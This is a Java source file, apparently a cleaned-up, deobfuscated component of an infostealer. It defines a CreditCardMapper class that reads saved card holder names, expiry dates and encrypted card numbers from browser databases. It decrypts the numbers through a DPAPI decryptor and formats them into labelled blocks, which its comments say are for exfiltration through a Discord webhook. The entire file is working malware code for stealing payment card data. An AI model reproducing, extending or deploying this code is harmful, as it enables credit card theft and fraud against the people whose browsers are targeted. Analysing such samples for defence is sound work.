import java.sql.ResultSet;

/**
 * Cleaned CreditCardMapper (formerly è.java)
 * Extracts credit card information (holder name, expiry, and encrypted number)
 * from browser databases and formats it for exfiltration.
 */
public class CreditCardMapper implements DataMapper {
    private final BrowserStats stats;
    private final DPAPIDecryptor decryptor;
    private final String browserProfile;

    public CreditCardMapper(BrowserStats stats, DPAPIDecryptor decryptor, String profile) {
        this.stats = stats;
        this.decryptor = decryptor;
        this.browserProfile = profile;
    }

    @Override
    public String mapRow(ResultSet rs) throws Exception {
        // Increment statistics for 'Credit Cards'
        this.stats.totalCardsFound++;

        String cardHolderName = rs.getString("name_on_card");
        String expirationMonth = rs.getString("expiration_month");
        String expirationYear = rs.getString("expiration_year");
        
        // Decrypt the card number using the DPAPI module (u.java)
        byte[] encryptedNumber = rs.getBytes("card_number_encrypted");
        String decryptedNumber = decryptor.decrypt(encryptedNumber);

        if (decryptedNumber == null || decryptedNumber.isBlank()) {
            return "";
        }

        this.stats.totalCardsDecrypted++;

        // Formats the data into a readable block for the Discord Webhook
        // Decoded strings from ZKM pool:
        String header = "\n--- [ CREDIT CARD FOUND ] ---";
        String nameLabel = "\nHolder Name: ";
        String expiryLabel = "\nExpiration: ";
        String numberLabel = "\nCard Number: ";
        
        return header + 
               nameLabel + cardHolderName + 
               expiryLabel + expirationMonth + "/" + expirationYear + 
               numberLabel + decryptedNumber + 
               "\n----------------------------";
    }
}
